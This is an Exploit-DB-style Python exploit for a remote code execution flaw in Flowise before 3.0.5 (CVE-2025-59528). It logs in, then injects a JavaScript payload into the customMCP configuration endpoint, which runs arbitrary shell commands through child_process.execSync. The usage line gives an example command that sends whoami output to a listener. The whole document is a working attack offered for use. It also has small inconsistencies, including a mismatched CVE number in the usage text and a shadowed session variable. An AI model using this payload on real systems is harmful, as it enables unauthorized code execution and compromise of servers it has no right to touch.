# Exploit Title: Flowise 3.0.4 - Remote Code Execution (RCE)
# Date: 10/11/2025
# Exploit Author: [nltt0] (https://github.com/nltt-br))
# Vendor Homepage: https://flowiseai.com/
# Software Link: https://github.com/FlowiseAI/Flowise
# Version: < 3.0.5
# CVE: CVE-2025-59528

from requests import post, session
from argparse import ArgumentParser

banner = r"""
_____       _                              _____
/  __ \     | |                            /  ___|
| /  \/ __ _| | __ _ _ __   __ _  ___  ___ \ `--.
| |    / _` | |/ _` | '_ \ / _` |/ _ \/ __| `--. \
| \__/\ (_| | | (_| | | | | (_| | (_) \__ \/\__/ /
\____/\__,_|_|\__,_|_| |_|\__, |\___/|___/\____/
                            __/ |
                          |___/

                by nltt0
"""

try:
    parser = ArgumentParser(description='CVE-2025-59528 [Flowise < 3.0.5]', usage="python CVE-2025-58434.py --email xtz@local --password Test@2025 --url http://localhost:3000 --cmd \"http://localhost:1337/`whoami`\"")
    parser.add_argument('-e', '--email', required=True, help='Registered email')
    parser.add_argument('-p', '--password', required=True)
    parser.add_argument('-u', '--url', required=True)
    parser.add_argument('-c', '--cmd', required=True)

    args = parser.parse_args()
    email = args.email
    password = args.password
    url = args.url
    cmd = args.cmd

    def login(email, url):
        session = session()
        url_format = "{}/api/v1/auth/login".format(url)
        headers = {"x-request-from": "internal", "Accept-Language": "pt-BR,pt;q=0.9", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "Origin": "http://workflow.flow.hc", "Referer": "http://workflow.flow.hc/signin", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
        data={"email": email, "password": password}
        r = session.post(url_format, headers=headers, json=data)
        return session, r

    def rce(email, url, password, cmd):
        session, status_code = login(email, url)
        url_format = "{}/api/v1/node-load-method/customMCP".format(url)
        command = f'({{x:(function(){{const cp = process.mainModule.require("child_process");cp.execSync("{cmd}");return 1;}})()}})'

        data = {
            "loadMethod": "listActions",
            "inputs": {
                "mcpServerConfig": command
            }
        }

        r = session.post(url_format, json=data)

        if r.status_code == 401:
            session.headers["x-request-from"] = "internal"
            session.post(url_format, json=data)

        print(f"[x] Command executed [{cmd}]")

    rce(email, url, password, cmd)

except Exception as e:
    print('Error in {}'.format(e))